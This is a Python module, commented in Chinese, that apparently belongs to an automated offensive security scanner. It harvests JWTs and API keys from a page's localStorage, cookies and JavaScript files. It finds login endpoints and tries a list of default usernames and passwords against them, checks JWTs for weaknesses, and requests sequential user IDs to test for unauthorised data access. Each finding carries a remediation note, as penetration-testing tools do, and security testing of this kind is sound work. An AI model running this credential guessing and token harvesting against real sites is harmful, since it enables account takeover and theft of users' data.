"""
认证突破模块

功能:
  1. 自动发现登录接口（从 JS/API 请求中提取）
  2. 提取页面中的 JWT Token / API Key
  3. 尝试默认密码爆破
  4. JWT 空签名 / 弱密钥测试
  5. 越权访问测试（水平/垂直）
"""

import re
import json
import base64
import time
import urllib.parse
from typing import List, Dict
from secops_core.logger import get_logger
from secops_core.config import ATTACK_DELAY

log = get_logger("auth_breaker")


class AuthBreaker:
    """
    认证突破器

    用法:
        breaker = AuthBreaker(page, context)
        findings = breaker.full_scan(base_url)
    """

    def __init__(self, page, context):
        self.page = page
        self.context = context
        self.discovered_tokens = []
        self.discovered_login_urls = []

    def full_scan(self, base_url: str) -> list:
        """完整认证突破扫描"""
        from secops_offense.attack_engine.finding import Finding
        findings = []

        # 1. 从 JS 和页面中提取 Token
        token_findings = self._extract_tokens(base_url)
        findings.extend(token_findings)

        # 2. 发现登录接口
        login_urls = self._discover_login_endpoints(base_url)

        # 3. 对发现的登录接口尝试默认密码
        if login_urls:
            cred_findings = self._brute_force_login(base_url, login_urls)
            findings.extend(cred_findings)

        # 4. JWT 测试
        jwt_findings = self._test_jwt(base_url)
        findings.extend(jwt_findings)

        # 5. API 越权测试
        idor_findings = self._test_idor(base_url)
        findings.extend(idor_findings)

        return findings

    def _extract_tokens(self, base_url: str) -> list:
        """从页面、JS、localStorage、Cookie 中提取 Token"""
        from secops_offense.attack_engine.finding import Finding
        findings = []

        # 从 localStorage 提取
        try:
            local_storage = self.page.evaluate("""() => {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    items[key] = localStorage.getItem(key);
                }
                return items;
            }""")

            for key, value in (local_storage or {}).items():
                if not value:
                    continue
                # JWT token
                if value.startswith("eyJ") and "." in value:
                    self.discovered_tokens.append({"type": "JWT", "source": f"localStorage.{key}", "value": value})
                    decoded = self._decode_jwt(value)
                    findings.append(Finding(
                        vuln_type="TokenLeak", severity="high",
                        title=f"JWT Token 暴露: localStorage.{key}",
                        location=base_url, payload=f"{key}={value[:50]}...",
                        evidence=f"JWT payload: {json.dumps(decoded, ensure_ascii=False)[:200]}",
                        description=f"localStorage 中存储了 JWT Token，攻击者可通过 XSS 窃取。",
                        remediation="将 Token 存储在 httpOnly Cookie 中"
                    ))
                # API Key
                elif len(value) > 16 and any(kw in key.lower() for kw in ["key", "token", "secret", "auth", "session"]):
                    self.discovered_tokens.append({"type": "APIKey", "source": f"localStorage.{key}", "value": value})
                    findings.append(Finding(
                        vuln_type="TokenLeak", severity="medium",
                        title=f"API Key 暴露: localStorage.{key}",
                        location=base_url, payload=f"{key}={value[:30]}...",
                        evidence=f"Key 长度: {len(value)}",
                        description=f"localStorage 中存储了 API Key。",
                        remediation="避免在前端存储敏感密钥"
                    ))
        except Exception as e:
            log.debug(f"localStorage 提取失败: {e}")

        # 从 Cookie 提取
        try:
            cookies = self.context.cookies()
            for cookie in cookies:
                name = cookie.get("name", "")
                value = cookie.get("value", "")
                if value.startswith("eyJ") and "." in value:
                    self.discovered_tokens.append({"type": "JWT", "source": f"cookie.{name}", "value": value})
                    findings.append(Finding(
                        vuln_type="TokenLeak", severity="medium",
                        title=f"JWT Cookie: {name}",
                        location=base_url, payload=f"{name}={value[:50]}...",
                        evidence=f"Cookie 中包含 JWT",
                        description=f"Cookie {name} 包含 JWT Token。",
                        remediation="设置 httpOnly 和 Secure 标志"
                    ))
                elif not cookie.get("httpOnly", False) and any(kw in name.lower() for kw in ["session", "token", "auth", "sid"]):
                    findings.append(Finding(
                        vuln_type="TokenLeak", severity="medium",
                        title=f"敏感 Cookie 缺少 httpOnly: {name}",
                        location=base_url, payload=name,
                        evidence=f"Cookie 未设置 httpOnly 标志",
                        description=f"Cookie {name} 缺少 httpOnly，可被 JS 读取。",
                        remediation="为敏感 Cookie 设置 httpOnly 标志"
                    ))
        except Exception:
            pass

        # 从 JS 文件中提取 Token 模式
        try:
            js_urls = []
            for req_log in self.page.context.request._requests if hasattr(self.page.context.request, '_requests') else []:
                pass  # fallback

            # 从已加载的 JS 中搜索
            scripts = self.page.evaluate("""() => {
                return Array.from(document.querySelectorAll('script[src]')).map(s => s.src);
            }""")
            for script_url in (scripts or [])[:5]:
                try:
                    resp = self.context.request.get(script_url, timeout=3000)
                    js_content = resp.text()

                    # 搜索硬编码的 token/key
                    patterns = [
                        (r'["\']([A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,})["\']', "JWT"),
                        (r'(?:api[_-]?key|apikey|secret[_-]?key)\s*[:=]\s*["\']([A-Za-z0-9_\-]{16,})["\']', "API Key"),
                        (r'(?:token|bearer)\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{20,})["\']', "Token"),
                    ]
                    for pattern, ptype in patterns:
                        matches = re.findall(pattern, js_content, re.IGNORECASE)
                        for match in matches:
                            self.discovered_tokens.append({"type": ptype, "source": script_url, "value": match})
                            findings.append(Finding(
                                vuln_type="TokenLeak", severity="high",
                                title=f"JS 中硬编码 {ptype}",
                                location=script_url, payload=match[:50] + "...",
                                evidence=f"在 JS 文件中发现硬编码的 {ptype}",
                                description=f"JS 文件中包含硬编码的 {ptype}，可通过源码访问获取。",
                                remediation="将敏感信息移至后端，使用环境变量"
                            ))
                except Exception:
                    pass
        except Exception:
            pass

        return findings

    def _discover_login_endpoints(self, base_url: str) -> list:
        """从 JS 和网络请求中发现登录接口"""
        login_urls = []
        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 常见登录路径
        common_login_paths = [
            "/api/login", "/api/auth/login", "/api/user/login",
            "/api/v1/login", "/api/v1/auth/login",
            "/api/signin", "/api/auth/signin",
            "/login", "/auth/login", "/signin",
            "/admin/login", "/admin/auth",
            "/api/account/login", "/api/member/login",
        ]

        for path in common_login_paths:
            url = base + path
            try:
                # 用 OPTIONS 或 GET 检测
                resp = self.context.request.get(url, timeout=2000)
                if resp.status in (200, 405, 401, 403):
                    login_urls.append(url)
                    log.info(f"  发现登录接口: {path} (HTTP {resp.status})")
            except Exception:
                pass
            time.sleep(0.1)

        # 从 JS 中搜索登录 URL
        try:
            scripts = self.page.evaluate("""() => {
                return Array.from(document.querySelectorAll('script[src]')).map(s => s.src);
            }""")
            for script_url in (scripts or [])[:5]:
                try:
                    resp = self.context.request.get(script_url, timeout=3000)
                    js = resp.text()
                    # 搜索 login 相关的 URL
                    login_patterns = re.findall(r'["\']([^"\']*(?:login|signin|auth|token)[^"\']*)["\']', js, re.IGNORECASE)
                    for p in login_patterns:
                        if p.startswith("/") and p not in common_login_paths:
                            url = base + p
                            if url not in login_urls:
                                login_urls.append(url)
                                log.info(f"  JS 中发现登录路径: {p}")
                except Exception:
                    pass
        except Exception:
            pass

        self.discovered_login_urls = login_urls
        return login_urls

    def _brute_force_login(self, base_url: str, login_urls: list) -> list:
        """对登录接口尝试默认密码"""
        from secops_offense.attack_engine.finding import Finding
        findings = []

        default_creds = [
            ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
            ("admin", "admin123"), ("admin", "12345678"), ("admin", "qwerty"),
            ("root", "root"), ("root", "toor"), ("root", "123456"),
            ("test", "test"), ("test", "123456"), ("guest", "guest"),
            ("user", "user"), ("user", "123456"),
            ("admin", "111111"), ("admin", "abc123"),
            ("administrator", "administrator"),
        ]

        for login_url in login_urls:
            log.info(f"  尝试爆破: {login_url}")

            # 先发一个请求看看接口格式
            try:
                resp = self.context.request.get(login_url, timeout=3000)
                body = resp.text()
                # 判断是 JSON API 还是表单
                is_json_api = "application/json" in resp.headers.get("content-type", "")
            except Exception:
                is_json_api = True  # 默认当 API 处理

            for username, password in default_creds[:8]:  # 限制次数
                try:
                    # 尝试 JSON 格式
                    resp = self.context.request.post(login_url, data=json.dumps({
                        "username": username, "password": password,
                        "email": f"{username}@test.com", "account": username,
                        "phone": username, "name": username,
                    }), headers={"Content-Type": "application/json"}, timeout=3000)

                    body = resp.text()
                    status = resp.status

                    # 判断是否登录成功
                    success = False
                    if status == 200:
                        try:
                            data = json.loads(body)
                            if isinstance(data, dict):
                                code = data.get("code", data.get("status", data.get("errno")))
                                if code in [0, 200, "0", "200", "success"]:
                                    success = True
                                if data.get("token") or data.get("access_token") or data.get("data", {}).get("token"):
                                    success = True
                        except json.JSONDecodeError:
                            if any(kw in body.lower() for kw in ["success", "token", "welcome", "dashboard"]):
                                success = True

                    if success:
                        findings.append(Finding(
                            vuln_type="WeakPassword", severity="critical",
                            title=f"默认密码: {login_url} ({username}/{password})",
                            location=login_url, payload=f"{username}:{password}",
                            evidence=f"登录成功: {body[:200]}",
                            description=f"登录接口使用默认凭据 {username}/{password}。",
                            remediation="修改默认密码，实施密码复杂度策略"
                        ))
                        log.info(f"  [!!!] 成功: {username}/{password}")
                        break

                    # 也试表单格式
                    resp2 = self.context.request.post(login_url, data={
                        "username": username, "password": password,
                    }, timeout=3000)
                    body2 = resp2.text()
                    if resp2.status == 200:
                        try:
                            data2 = json.loads(body2)
                            if isinstance(data2, dict):
                                code = data2.get("code", data2.get("status"))
                                if code in [0, 200, "0", "200"] or data2.get("token"):
                                    findings.append(Finding(
                                        vuln_type="WeakPassword", severity="critical",
                                        title=f"默认密码 (表单): {login_url} ({username}/{password})",
                                        location=login_url, payload=f"{username}:{password}",
                                        evidence=f"登录成功: {body2[:200]}",
                                        description=f"登录接口使用默认凭据。",
                                        remediation="修改默认密码"
                                    ))
                                    break
                        except json.JSONDecodeError:
                            pass

                except Exception as e:
                    log.debug(f"  请求失败: {e}")

                time.sleep(0.3)

        return findings

    def _decode_jwt(self, token: str) -> dict:
        """解码 JWT token (不验证签名)"""
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                payload = parts[1]
                # 补齐 base64 padding
                payload += "=" * (4 - len(payload) % 4)
                decoded = base64.urlsafe_b64decode(payload)
                return json.loads(decoded)
        except Exception:
            pass
        return {}

    def _test_jwt(self, base_url: str) -> list:
        """JWT 漏洞测试"""
        from secops_offense.attack_engine.finding import Finding
        findings = []

        for token_info in self.discovered_tokens:
            if token_info["type"] != "JWT":
                continue

            token = token_info["value"]
            decoded = self._decode_jwt(token)

            if not decoded:
                continue

            # 1. 检查 JWT 是否使用 none 算法
            try:
                header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
                alg = header.get("alg", "")
                if alg == "none":
                    findings.append(Finding(
                        vuln_type="JWT", severity="critical",
                        title="JWT 使用 none 算法",
                        location=base_url, payload=f"alg={alg}",
                        evidence=f"JWT header: {json.dumps(header)}",
                        description="JWT 使用 none 算法，可伪造任意 Token。",
                        remediation="使用 RS256 或 HS256 算法"
                    ))
            except Exception:
                pass

            # 2. 检查敏感信息泄露
            sensitive_keys = ["password", "secret", "key", "admin", "role", "permission"]
            for key in sensitive_keys:
                if key in str(decoded).lower():
                    findings.append(Finding(
                        vuln_type="JWT", severity="medium",
                        title=f"JWT 包含敏感字段: {key}",
                        location=base_url, payload=f"{key} in JWT",
                        evidence=f"JWT payload: {json.dumps(decoded, ensure_ascii=False)[:200]}",
                        description=f"JWT 中包含敏感字段 {key}。",
                        remediation="不要在 JWT 中存储敏感信息"
                    ))
                    break

            # 3. 检查 JWT 是否有过期时间
            if "exp" not in decoded:
                findings.append(Finding(
                    vuln_type="JWT", severity="medium",
                    title="JWT 缺少过期时间",
                    location=base_url, payload="no exp claim",
                    evidence=f"JWT payload 中没有 exp 字段",
                    description="JWT 没有设置过期时间，Token 永久有效。",
                    remediation="为 JWT 设置合理的过期时间"
                ))

        return findings

    def _test_idor(self, base_url: str) -> list:
        """越权访问测试 (IDOR)"""
        from secops_offense.attack_engine.finding import Finding
        findings = []

        # 常见的用户相关 API
        user_apis = [
            "/api/user/1", "/api/user/2", "/api/users/1", "/api/users/2",
            "/api/profile", "/api/profile/1", "/api/profile/2",
            "/api/order/1", "/api/order/2", "/api/orders/1",
            "/api/member/1", "/api/member/2",
            "/api/account/1", "/api/account/2",
            "/api/v1/user/1", "/api/v1/user/2",
        ]

        parsed = urllib.parse.urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in user_apis:
            url = base + path
            try:
                resp = self.context.request.get(url, timeout=2000)
                if resp.status == 200:
                    body = resp.text()
                    try:
                        data = json.loads(body)
                        if isinstance(data, dict) and len(str(data)) > 50:
                            # 检查是否包含用户数据
                            data_str = str(data).lower()
                            if any(kw in data_str for kw in ["email", "phone", "name", "user", "account"]):
                                findings.append(Finding(
                                    vuln_type="IDOR", severity="high",
                                    title=f"越权访问: {path}",
                                    location=url, payload="GET " + path,
                                    evidence=f"返回用户数据: {body[:200]}",
                                    description=f"API {path} 无需认证即可访问用户数据，存在越权漏洞。",
                                    remediation="对用户 API 添加权限校验"
                                ))
                                break
                    except json.JSONDecodeError:
                        pass
            except Exception:
                pass

            time.sleep(0.1)

        return findings
